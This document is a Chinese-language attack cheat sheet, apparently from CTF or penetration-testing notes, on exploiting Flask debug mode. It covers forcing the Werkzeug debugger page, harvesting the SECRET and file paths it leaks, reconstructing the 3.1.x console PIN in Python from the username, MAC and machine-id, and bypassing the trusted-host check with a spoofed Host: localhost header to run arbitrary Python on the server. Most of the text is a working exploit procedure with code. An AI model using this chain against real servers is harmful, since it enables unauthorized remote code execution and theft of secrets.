# Werkzeug Debug PIN → RCE（Flask debug 模式）

Flask `debug=True`（Werkzeug Debugger）提供一个被 9 位 PIN 门控的交互 console。破解 PIN = 服务器上任意 Python 执行。**Werkzeug 3.1.x 改了算法（相对 ≤3.0.x），用错版本白算。**

## 触发 & 免费收割 debug 页

- 让任意路由抛未捕获异常（如视图里 `data['missing_key']`）。500 页就是 Werkzeug debugger HTML。
- 该页**无需 PIN 直接泄露**：`SECRET = "<20位>"`（gen_salt(20)，每次重启随机——**不是 PIN、不参与 PIN 哈希**，只用于签名 debugger 请求）、每个栈帧的完整源码路径+行号+函数名（`File "/home/<user>/<app>.py", line N, in <fn>`）、以及 `Server: Werkzeug/3.1.3 Python/3.10.12` 头（精确定版本）。
- debugger JS 在 `?__debugger__=yes&cmd=resource&f=debugger.js`，能看出端点语法。

## 端点（都带 `&s=SECRET`）

- `?__debugger__=yes&cmd=pinauth&pin=<pin>&s=<SECRET>` → `{"auth":bool,"exhausted":bool}`。pin 错或 s 错 → 400。
- `?__debugger__=yes&cmd=printpin&s=<SECRET>` → 打印 pin（需 pin_logging + 可信 host）。
- console 执行：`?__debugger__=yes&cmd=<python表达式>&frm=<frameID>&s=<SECRET>`（frameID 取自 HTML 里 `id="frame-<int>"`）。
- 锁定：`check_pin_trust` 在 `_failed_pin_auth >= 10` 后返回 False → `exhausted:true`，只有重启服务能重置。

## PIN 算法 — Werkzeug 3.1.x（private_bits 变了）

```python
probably_public_bits = [
    username,          # getpass.getuser() — 从源码路径 /home/<user>/... 反推
    "flask.app",       # modname
    "Flask",           # getattr(app, "__name__", type(app).__name__)
    "/usr/local/lib/python3.10/dist-packages/flask/app.py",  # mod.__file__
]                     # 注意：3.1.x 没有 root_path（≤3.0.x 有）

private_bits = [
    str(uuid.getnode()),   # 网卡 MAC 的十进制整数(48位)；/sys 不可读时回退随机值
    get_machine_id(),      # bytes：/etc/machine-id（否则 /proc/sys/kernel/random/boot_id）
]                          #   + /proc/self/cgroup 首行最后一个 "/" 之后的段

# get_machine_id()：linux = machine-id/boot_id 第一个非空值；再 linux += cgroup首行.rpartition("/")[2]

import hashlib, itertools
h = hashlib.sha1()
for b in itertools.chain(probably_public_bits, private_bits):
    if not b: continue
    h.update(b.encode() if isinstance(b, str) else b)
h.update(b"cookiesalt")
cookie_name = f"__wzd{h.hexdigest()[:20]}"
h.update(b"pinsalt")
num = f"{int(h.hexdigest(), 16):09d}"[:9]
# 分组：3-3-3（或 4-5 等），用 "-" 连接
```

## 破解输入（要补齐的东西）

- **username**：从 debug 页栈路径 `/home/<user>/<app>.py` 直接读。
- **MAC + machine-id**：需要目标上的文件读取原语（SSRF file://、LFI、任意文件读 bug）。同一台机器上的两个 Flask 应用（如 :8000 和 :7000）共用同一 machine-id + MAC，只是 username 可能不同。
- 若 `/sys/class/net` 不可读，uuid.getnode() 回退**随机** 48 位（不可预测），必须另找真实 MAC 泄露源，别硬爆破 MAC。

## 坑

- `SECRET` 不是 PIN、也不参与哈希——别把它喂进 PIN 算法。
- gen_salt(20) 每次重启重生成 → SECRET 变；PIN 本身半稳定（只依赖 machine-id+MAC+username）。
- `pinauth` 返回 400（而非 403）通常是 `s` 参数 ≠ self.secret，不是 pin 错。
- `check_host_trust` 会对非本地 Host 头返回 400，即使 SECRET 正确。**绕过：请求加 `Host: localhost` 或 `Host: 127.0.0.1` 头即可通过 trusted_hosts 检查**（访问 `/console` 或 debug 端点返回 400 时先加这个头，实测 `Host: localhost` 直接 200）。
- `cmd=source&f=frame-<id>` 只返回当前异常帧附近的源码片段，**不是完整文件**——拿不到全源码，别指望它 dump，要完整文件得靠别的文件读取原语。
- 触发 debug 页不止缺 key 一种：**类型错误也能触发**（如 `create-vps/abc` 里的 `int("abc")` ValueError），且连带泄露该函数源码 + 里面引用的全局变量名与外部 API 端点（如 `tidadigi_token`、`https://cms.xxx.com/api/v1/cshp-order/create`）。
